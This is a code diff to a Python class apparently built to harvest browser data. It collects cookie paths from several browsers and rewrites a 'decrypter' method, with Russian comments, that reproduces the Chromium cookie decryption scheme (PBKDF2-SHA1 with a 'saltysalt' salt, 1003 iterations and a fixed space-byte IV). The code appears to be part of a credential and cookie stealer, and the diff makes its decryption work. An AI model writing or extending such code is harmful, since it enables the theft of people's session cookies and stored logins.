@@ -17,8 +17,6 @@ import string
 import sys
 import tempfile
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives import hashes, padding
 from cryptography.hazmat.backends import default_backend
 
 DEBUG = True
@@ -98,48 +96,25 @@ class Broswer:
                 self.cookies_path.append({browser_name: cookies_data})
 
     def decrypter(self, cipher_text, key):
-        try:
-            # Обеспечить правильное дополнение base64-строки и декодировать ее
-            def decode_base64(data):
-                missing_padding = len(data) % 4
-                if missing_padding:
-                    data += '=' * (4 - missing_padding)
-                return base64.b64decode(data)
+        # Декодируем ключ из base64
+        key = base64.b64decode(key)
 
-            # Декодировать base64-кодированный текст шифра
-            cipher_text_decoded = decode_base64(
-                cipher_text.encode('utf-8'))  # Преобразовать в байты перед декодированием
+        # Генерируем ключ с помощью PBKDF2-HMAC-SHA1
+        key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
 
-            # Извлечь IV из начала декодированного текста шифра (предполагается, что он добавлен в начало)
-            iv = cipher_text_decoded[:16]
-            encrypted_data = cipher_text_decoded[16:]
+        # Инициализационный вектор (IV)
+        iv = b'\x20' * 16
 
-            # Вывести ключ с использованием PBKDF2
-            kdf = PBKDF2HMAC(
-                algorithm=hashes.SHA1(),
-                length=16,
-                salt=b'saltysalt',
-                iterations=1003,
-                backend=default_backend()
-            )
-            key_bytes = kdf.derive(key.encode('utf-8'))
+        # Создаем объект шифра
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
 
-            # Настроить AES-дешифрование
-            cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
-            decryptor = cipher.decryptor()
+        # Создаем дешифратор
+        decryptor = cipher.decryptor()
 
-            # Расшифровать данные
-            padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
+        # Дешифруем данные
+        decrypted_data = decryptor.update(cipher_text[3:]) + decryptor.finalize()
 
-            # Удалить дополнение из расшифрованных данных
-            unpadder = padding.PKCS7(128).unpadder()
-            decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
-
-            return decrypted_data.decode('utf-8')  # Предполагается, что расшифрованные данные закодированы в UTF-8
-
-        except Exception as e:
-            print(f"[-] Error during decryption: {e}")
-            return None
+        return decrypted_data
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
